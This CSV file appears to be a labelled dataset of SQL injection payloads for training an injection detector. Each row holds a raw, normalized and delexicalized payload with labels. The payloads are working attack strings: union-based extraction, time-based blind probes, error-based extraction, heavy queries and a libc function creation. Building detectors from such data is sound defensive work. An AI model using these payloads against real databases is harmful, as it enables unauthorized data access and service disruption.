payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""bfko""  =  ""bfko","1"" ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""bfko"" = ""bfko",<NUM><STR>bfko<STR>bfko,1,False,,sqli_dataset
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""%""  =  ""","select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ""%"" = ""","select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( <STR> = """,1,False,,sqli_dataset
"1   )    )    as midl where 9046  =  9046 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --","1 ) ) as midl where 9046 = 9046 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --","<NUM> ) ) as midl where <NUM> = <NUM> and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --",1,False,,sqli_dataset
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'qiau'  =  'qiau,1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'qiau' = 'qiau,<NUM><STR>qiau<STR>qiau,1,False,,sqli_dataset
1 where 9393  =  9393 waitfor delay '0:0:5'--,1 where 9393 = 9393 waitfor delay '0:0:5'--,<NUM> where <NUM> = <NUM> waitfor delay <STR>--,1,False,,sqli_dataset
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo",1,False,,sqli_dataset
"1%' union all select null,null,null,null,null,null,null,null#","1%' union all select null,null,null,null,null,null,null,null#","<NUM>%' union all select null,null,null,null,null,null,null,null#",1,False,,sqli_dataset
"1%"" and sleep  (  5  )  #","1%"" and sleep ( 5 ) #","<NUM>%"" and sleep ( <NUM> ) #",1,False,,sqli_dataset
"1%'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","1%' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM>%' ) and <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,False,,sqli_dataset
"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '","1%' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and '%' = '",<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"-4869%' union all select 5729,5729,5729--","-4869%' union all select 5729,5729,5729--","-<NUM>%' union all select <NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1'  )   and make_set  (  8403  =  8403,8899  )","1' ) and make_set ( 8403 = 8403,8899 )","<NUM>' ) and make_set ( <NUM> = <NUM>,<NUM> )",1,False,,sqli_dataset
-8463   )    )     )   or 4861  =  9834#,-8463 ) ) ) or 4861 = 9834#,-<NUM> ) ) ) or <NUM> = <NUM>#,1,False,,sqli_dataset
"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '","1%' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( '%' = '",<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","1' ) where 8252 = 8252 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","<NUM>' ) where <NUM> = <NUM> or <NUM> = benchmark ( <NUM>,md5 ( 0x544d5a4c ) ) #",1,True,,sqli_dataset
"1   )    )    union all select null,null,null,null,null#","1 ) ) union all select null,null,null,null,null#","<NUM> ) ) union all select null,null,null,null,null#",1,False,,sqli_dataset
-3867%'  )   or 3084  =  5633 and   (  '%'  =  ',-3867%' ) or 3084 = 5633 and ( '%' = ',-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"create or replace function sleep  (  int  )   returns int as '/lib/libc.so.6','sleep' language 'c' strict","create or replace function sleep ( int ) returns int as '/lib/libc.so.6','sleep' language 'c' strict","create or replace function sleep ( int ) returns int as <STR>,<STR> language <STR> strict",1,False,,sqli_dataset
-7565%'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',-7565%' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = ',-<NUM>%<STR>%<STR>,1,True,,sqli_dataset
select   (  case when   (  6287  =  8341  )   then 6287 else 1/  (  select 0  )   end  )  --,select ( case when ( 6287 = 8341 ) then 6287 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --,1,False,,sqli_dataset
-2456'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'bbkp'  =  'bbkp,-2456' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'bbkp' = 'bbkp,-<NUM><STR>bbkp<STR>bbkp,1,False,,sqli_dataset
"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1%"" ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>%"" ) ) and <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,False,,sqli_dataset
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""text"" like ""text","1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""text"" like ""text",<NUM><STR>text<STR>text,1,True,,sqli_dataset
"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--","-2364'+ ( select 'qdut' where 7560 = 7560 union all select 7560,7560,7560,7560,7560--","-<NUM><STR>qdut' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,True,,sqli_dataset
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'uadr' like 'uadr","1' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'uadr' like 'uadr",<NUM><STR>uadr<STR>uadr,1,False,,sqli_dataset
"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '","1%' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
-1354   )    )    or 8571  =  8571--,-1354 ) ) or 8571 = 8571--,-<NUM> ) ) or <NUM> = <NUM>--,1,False,,sqli_dataset
"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #","1' ) and elt ( 3114 = 3114,sleep ( 5 ) ) #","<NUM>' ) and elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #",1,False,,sqli_dataset
"-7743"" or 9323  =  9323#","-7743"" or 9323 = 9323#","-<NUM>"" or <NUM> = <NUM>#",1,False,,sqli_dataset
"-9928""   )    )    union all select 7511,7511,7511,7511,7511,7511,7511,7511#","-9928"" ) ) union all select 7511,7511,7511,7511,7511,7511,7511,7511#","-<NUM>"" ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1  )   where 9213  =  9213 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","1 ) where 9213 = 9213 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM> ) where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,False,,sqli_dataset
1'||  (  select 'ghby' from dual where 4854  =  4854,1'|| ( select 'ghby' from dual where 4854 = 4854,<NUM><STR>ghby' from dual where <NUM> = <NUM>,1,False,,sqli_dataset
-4032'  )   where 5157  =  5157 or 1809  =  2810#,-4032' ) where 5157 = 5157 or 1809 = 2810#,-<NUM>' ) where <NUM> = <NUM> or <NUM> = <NUM>#,1,False,,sqli_dataset
"1""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""abcm"" like ""abcm","1"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""abcm"" like ""abcm",<NUM><STR>abcm<STR>abcm,1,False,,sqli_dataset
1'  )   or sleep  (  5  )   and   (  'kgbm'  =  'kgbm,1' ) or sleep ( 5 ) and ( 'kgbm' = 'kgbm,<NUM><STR>kgbm<STR>kgbm,1,False,,sqli_dataset
"1'||  (  select 'eils' where 8308  =  8308 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","1'|| ( select 'eils' where 8308 = 8308 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","<NUM><STR>eils' where <NUM> = <NUM> or <NUM> = benchmark ( <NUM>,md5 ( 0x544d5a4c ) ) #",1,True,,sqli_dataset
"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  -- xsob","1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) -- xsob","<NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) -- xsob",1,False,,sqli_dataset
1  )   where 2307  =  2307,1 ) where 2307 = 2307,<NUM> ) where <NUM> = <NUM>,1,False,,sqli_dataset
"1""  )   as ifgl where 2190  =  2190 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --","1"" ) as ifgl where 2190 = 2190 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --","<NUM>"" ) as ifgl where <NUM> = <NUM> rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ) --",1,True,,sqli_dataset
-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,-8999' ) ) ) or 6872 = 6872 and ( ( ( 'jare' = 'jare,-<NUM><STR>jare<STR>jare,1,False,,sqli_dataset
"-1254"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )","-1254"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","-<NUM>"" or <NUM> = ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual )",1,False,,sqli_dataset
"1' in boolean mode  )   and elt  (  9630  =  4765,4765  )  #","1' in boolean mode ) and elt ( 9630 = 4765,4765 ) #","<NUM>' in boolean mode ) and elt ( <NUM> = <NUM>,<NUM> ) #",1,False,,sqli_dataset
"1%"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""%""  =  ""","1%"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""%"" = """,<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"1'  )   union all select null,null,null--","1' ) union all select null,null,null--","<NUM>' ) union all select null,null,null--",1,False,,sqli_dataset
"1' in boolean mode  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #","1' in boolean mode ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) #","<NUM>' in boolean mode ) or ( select <NUM> from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from information_schema.character_sets group by x ) a ) #",1,True,,sqli_dataset
"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--","-1988 where 4597 = 4597 union all select 4597,4597,4597,4597,4597,4597--","-<NUM> where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"-4923"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""afjc"" like ""afjc","-4923"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""afjc"" like ""afjc",-<NUM><STR>afjc<STR>afjc,1,False,,sqli_dataset
"1'  )   and make_set  (  6488  =  5525,5525  )","1' ) and make_set ( 6488 = 5525,5525 )","<NUM>' ) and make_set ( <NUM> = <NUM>,<NUM> )",1,False,,sqli_dataset
1' in boolean mode  )   union all select null#,1' in boolean mode ) union all select null#,<NUM>' in boolean mode ) union all select null#,1,False,,sqli_dataset
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""rugr""  =  ""rugr","call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""rugr"" = ""rugr","call regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) and <STR> = ""rugr",1,False,,sqli_dataset
1'  )   where 8086  =  8086 and 1430  =  7941--,1' ) where 8086 = 8086 and 1430 = 7941--,<NUM>' ) where <NUM> = <NUM> and <NUM> = <NUM>--,1,False,,sqli_dataset
"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#","1"" ) as xaye where 5343 = 5343 and 4355 = 7475#","<NUM>"" ) as xaye where <NUM> = <NUM> and <NUM> = <NUM>#",1,False,,sqli_dataset
"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1"" ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>"" ) or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'","1'|| ( select 'bccx' where 5881 = 5881 and elt ( 1210 = 1210,sleep ( 5 ) ) ) ||'",<NUM><STR>bccx<STR>,1,False,,sqli_dataset
"-8487'  )   where 9655  =  9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--","-8487' ) where 9655 = 9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--","-<NUM>' ) where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
-4389'   )    )     )   or   (  1139  =  3499  )  *3499 and    (    (     (  'qoch'  =  'qoch,-4389' ) ) ) or ( 1139 = 3499 ) *3499 and ( ( ( 'qoch' = 'qoch,-<NUM><STR>qoch<STR>qoch,1,False,,sqli_dataset
"-4033'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ouup'  =  'ouup","-4033' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'ouup' = 'ouup",-<NUM><STR>ouup<STR>ouup,1,True,,sqli_dataset
1' where 6406  =  6406,1' where 6406 = 6406,<NUM>' where <NUM> = <NUM>,1,False,,sqli_dataset
"1'  )   where 5799  =  5799 union all select null,null,null,null,null--","1' ) where 5799 = 5799 union all select null,null,null,null,null--","<NUM>' ) where <NUM> = <NUM> union all select null,null,null,null,null--",1,False,,sqli_dataset
"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""zlwb""  =  ""zlwb","1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""zlwb"" = ""zlwb",<NUM><STR>zlwb<STR>zlwb,1,True,,sqli_dataset
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""djrh""  =  ""djrh","1"" ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""djrh"" = ""djrh",<NUM><STR>djrh<STR>djrh,1,False,,sqli_dataset
-2129'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'eutm' like 'eutm,-2129' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'eutm' like 'eutm,-<NUM><STR>eutm<STR>eutm,1,True,,sqli_dataset
"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'ogwd' like 'ogwd","1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'ogwd' like 'ogwd",<NUM><STR>ogwd<STR>ogwd,1,False,,sqli_dataset
"-2784'   )    )    union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#","-2784' ) ) union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#","-<NUM>' ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569","-8094 ) or elt ( 1032 = 1032,3623 ) and ( 4569 = 4569","-<NUM> ) or elt ( <NUM> = <NUM>,<NUM> ) and ( <NUM> = <NUM>",1,False,,sqli_dataset
"-2909'||  (  select 'qfeq' where 7062  =  7062 union all select 7062,7062,7062,7062,7062,7062--","-2909'|| ( select 'qfeq' where 7062 = 7062 union all select 7062,7062,7062,7062,7062,7062--","-<NUM><STR>qfeq' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
-3520%' or 8571  =  8571--,-3520%' or 8571 = 8571--,-<NUM>%' or <NUM> = <NUM>--,1,False,,sqli_dataset
"1"" where 1618  =  1618 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1"" where 1618 = 1618 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>"" where <NUM> = <NUM> or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
1'  )   where 7478  =  7478,1' ) where 7478 = 7478,<NUM>' ) where <NUM> = <NUM>,1,False,,sqli_dataset
-8080'   )    )    order by 1#,-8080' ) ) order by 1#,-<NUM>' ) ) order by <NUM>#,1,False,,sqli_dataset
"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--","-2798'+ ( select 'emui' where 9565 = 9565 union all select 9565,9565,9565,9565--","-<NUM><STR>emui' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>--",1,True,,sqli_dataset
"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--","-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--","-<NUM>%' union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ),1 ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ),<NUM> ) or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ),1,False,,sqli_dataset
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'bgdp'  =  'bgdp","1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'bgdp' = 'bgdp",<NUM><STR>bgdp<STR>bgdp,1,True,,sqli_dataset
1'||  (  select 'svnn' from dual where 8710  =  8710,1'|| ( select 'svnn' from dual where 8710 = 8710,<NUM><STR>svnn' from dual where <NUM> = <NUM>,1,False,,sqli_dataset
end and   (  'jzlr'  =  'jzlr,end and ( 'jzlr' = 'jzlr,end and ( <STR> = 'jzlr,1,False,,sqli_dataset
"-4558"" or   (  3965  =  3933  )  *3933 and ""hmdb"" like ""hmdb","-4558"" or ( 3965 = 3933 ) *3933 and ""hmdb"" like ""hmdb",-<NUM><STR>hmdb<STR>hmdb,1,False,,sqli_dataset
"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )","1', ( select ( case when ( 3888 = 3888 ) then ( select count ( * ) from generate_series ( 1,5000000 ) ) else 1/ ( select 0 ) end ) )","<NUM>', ( select ( case when ( <NUM> = <NUM> ) then ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) else <NUM>/ ( select <NUM> ) end ) )",1,False,,sqli_dataset
1'  )   as dpmh where 5281  =  5281 and 2006  =  2006,1' ) as dpmh where 5281 = 5281 and 2006 = 2006,<NUM>' ) as dpmh where <NUM> = <NUM> and <NUM> = <NUM>,1,False,,sqli_dataset
1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1' ) where 3767 = 3767 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,<NUM><STR>qqpjq<STR>qzvzq' ) --,1,False,,sqli_dataset
"1""   )    )    as nbdc where 4444  =  4444 union all select null,null--","1"" ) ) as nbdc where 4444 = 4444 union all select null,null--","<NUM>"" ) ) as nbdc where <NUM> = <NUM> union all select null,null--",1,False,,sqli_dataset
"select * from generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   limit 1--","select * from generate_series ( 2673,2673,case when ( 2673 = 1468 ) then 1 else 0 end ) limit 1--","select * from generate_series ( <NUM>,<NUM>,case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) limit <NUM>--",1,False,,sqli_dataset
